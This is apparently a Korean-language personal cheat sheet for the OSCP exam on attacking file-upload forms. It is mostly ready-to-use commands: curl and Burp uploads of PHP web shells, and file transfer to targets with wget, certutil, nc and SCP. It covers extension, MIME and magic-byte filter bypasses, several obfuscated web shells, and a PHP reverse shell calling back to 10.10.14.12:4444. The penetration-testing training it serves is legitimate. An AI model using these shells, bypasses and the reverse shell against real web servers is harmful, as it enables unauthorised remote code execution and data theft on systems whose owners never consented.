# 파일 업로드 기법 (OSCP 시험용)

## curl - 웹사이트 파일 업로드

```bash
# ★ 중요: @는 로컬파일 지정자임!!! 절대 빼먹지 말것 ★

# 기본 업로드 - 대부분의 웹폼에서 동작
curl -F "file=@/home/kali/shell.php" http://10.10.10.10/upload.php
curl -F "fileToUpload=@./shell.php" http://10.10.10.10/upload.php

# -v로 전체 HTTP 요청/응답 보기
curl -v -F "file=@./shell.php" http://10.10.10.10/upload.php

# 다른 필드값 추가 (웹폼 분석해서 필요한 항목 추가)
curl -F "file=@./shell.php" -F "token=1234" -F "submit=Upload" http://10.10.10.10/upload.php

# 파일명 변경 (확장자 필터링 우회)
curl -F "file=@./shell.php;filename=shell.jpg" http://10.10.10.10/upload.php

# 타입 변경 (MIME 타입 필터링 우회)
curl -F "file=@./shell.php;type=image/jpeg" http://10.10.10.10/upload.php

# 헤더 추가 (인증 필요한 경우)
curl -F "file=@./shell.php" -H "Cookie: PHPSESSID=4je2f1o3m2df" http://10.10.10.10/upload.php
```

## 수동 HTTP 요청 작성 (BurpSuite에서 사용)

```
POST /upload.php HTTP/1.1
Host: 10.10.10.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: 236

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

## 파일 전송 방법 (내 PC → 타겟)

### 방법1: 웹서버 + wget/curl (가장 많이 씀!!!)

```bash
# 1. 공격자 PC에서 웹서버 실행
cd /home/kali/payloads    # 전송할 파일이 있는 폴더로 이동
python3 -m http.server 80 # 80포트로 서버열기 (sudo 필요)

# 2. 타겟에서 내 파일 다운받기
wget http://내IP/shell.php       # wget으로 다운로드
curl -O http://내IP/shell.php     # curl로 다운로드
certutil -urlcache -f http://내IP/shell.exe shell.exe  # Windows에서
```

### 방법2: SCP (SSH 접근 가능할 때)

```bash
# 내 PC → 타겟
scp ./shell.php user@10.10.10.10:/tmp/
scp -P 2222 ./shell.php user@10.10.10.10:/var/www/html/  # 포트지정

# 타겟 → 내 PC (데이터 빼올 때)
scp user@10.10.10.10:/etc/passwd ./evidence/
```

### 방법3: NC (방화벽 우회에 유용)

```bash
# 타겟에서 받기 모드
nc -lvp 4444 > shell.php

# 내 PC에서 보내기
nc 10.10.10.10 4444 < shell.php

# 바이너리 파일은 (압축해서 전송)
# 내 PC에서:
tar -cf - shell.bin | nc 10.10.10.10 4444
# 타겟에서:
nc -lvp 4444 | tar -xf -
```

### 방법4: 기타 전송방법

```bash
# FTP 서버 사용 (익명 로그인 허용시)
ftp 10.10.10.10
> put shell.php

# PHP 웹쉘에서 (이미 RCE가 있을 때)
echo "<?php file_put_contents('shell.php', file_get_contents('http://내IP/shell.php')); ?>"

# Base64로 전송 (작은 파일)
# 1. 내 PC에서 인코딩
base64 -w 0 shell.php
# 2. 타겟에서 디코딩
echo "base64문자열" | base64 -d > shell.php
```

## 업로드 필터 우회 기법 (시험에서 자주 나옴!)

### 1. 확장자 필터링 우회

```
# 시도해볼 트릭 목록
shell.php → shell.php.jpg  (이중 확장자)
shell.php → shell.pHp      (대소문자)
shell.php → shell.phtml    (대체 확장자)
shell.php → shell.PHP5     (다른 버전)
shell.php → shell.php.      (점 추가)
shell.php → "shell.php "    (공백 추가)
shell.php → shell.php;.jpg  (세미콜론)
shell.php → shell.ph\x70   (16진수 인코딩)

# 널바이트 삽입 (PHP 5.3.4 미만)
shell.php → shell.php%00.jpg
```

### 2. MIME 타입 변조 (Burp에서 변경)

```
# 원래 값
Content-Type: application/x-php

# 변경할 값 (이미지처럼 속이기)
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### 3. 매직바이트/시그니처 속이기

```bash
# GIF 파일 헤더 추가한 웹쉘
echo 'GIF89a;<?php system($_GET["cmd"]); ?>' > shell.gif

# JPEG 헤더 추가
printf "\xFF\xD8\xFF\xE0" > header.jpg
cat header.jpg shell.php > shell.jpg.php

# 이미지에 PHP 코드 숨기기
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

### 4. 클라이언트 측 검사 우회

```
# 방법1: F12 개발자도구로 JS 비활성화
# 방법2: 폼 제출 직전에 Burp로 가로채서 파일 내용/이름 변경
# 방법3: HTML 편집해서 accept=".jpg,.png,.gif" 속성 제거
```

## 업로드 성공 후 파일 접근 및 테스트

```
# 일반적인 업로드 경로 추측
http://10.10.10.10/uploads/shell.php
http://10.10.10.10/images/shell.php
http://10.10.10.10/upload/shell.php
http://10.10.10.10/files/shell.php

# 명령 실행 테스트
http://10.10.10.10/uploads/shell.php?cmd=id
http://10.10.10.10/uploads/shell.php?0=id
http://10.10.10.10/uploads/shell.jpg.php%00?cmd=whoami

# dirb/gobuster로 업로드 폴더 찾기
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

## 자주 쓰는 웹쉘 코드 (콘텐츠 필터링 우회용)

```php
// 1. 기본 웹쉘
<?php system($_GET['cmd']); ?>

// 2. 백틱 사용 (alternative)
<?php echo `$_GET[0]`; ?>

// 3. 함수명 필터링 우회
<?php $_GET['f']($_GET['c']); ?>
// 사용법: ?f=system&c=id

// 4. 인코딩 우회
<?php eval(base64_decode($_REQUEST[1])); ?>
// 사용법: ?1=c3lzdGVtKCdpZCcp

// 5. 파일 포함
<?php include($_GET["file"]); ?>
// 사용법: ?file=/etc/passwd

// 6. 리버스 쉘 원라이너
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1'"); ?>
```

## 내가 많이 쓰는 파일 업로드 공격 패턴

1. 파일 업로드 폼 찾기
2. 기본 PHP 파일 시도 (system/exec 함수)
3. 업로드 실패시 확장자 검사 우회 (.php.jpg, .phtml 등)
4. 확장자 성공해도 내용 필터링시 매직바이트 추가
5. BurpSuite로 Content-Type 변조 시도
6. 클라이언트측 검증 우회 (JS 비활성화)
7. 성공 후 쉘 접속해서 권한상승 시도

## 파일 업로드 취약점 자주 발견되는 곳

- 프로필 이미지 업로드 기능
- 첨부파일 업로드
- 관리자 페이지 백업 기능
- 제품/카탈로그 이미지 업로드
- 이력서/문서 제출 폼
- 댓글에 이미지 첨부 기능
